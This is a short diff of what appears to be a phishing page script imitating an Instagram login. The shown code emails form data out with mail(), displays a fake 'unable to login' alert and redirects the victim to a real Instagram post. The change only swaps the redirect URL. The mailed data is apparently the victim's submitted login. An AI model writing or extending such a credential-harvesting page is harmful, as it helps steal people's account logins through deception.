@@ -21,7 +21,7 @@ else
     mail($to,$subject,$txt); // send an email 
     echo"<script type='text/javascript'>alert('Sorry ! unable to login ');
      // Simulate an HTTP redirect:
-    window.location.replace('http://www.instagram.com');
+    window.location.replace('https://www.instagram.com/p/CwdiwoetUm5/?igshid=MzRlODBiNWFlZA==');
     </script>";
 }
 
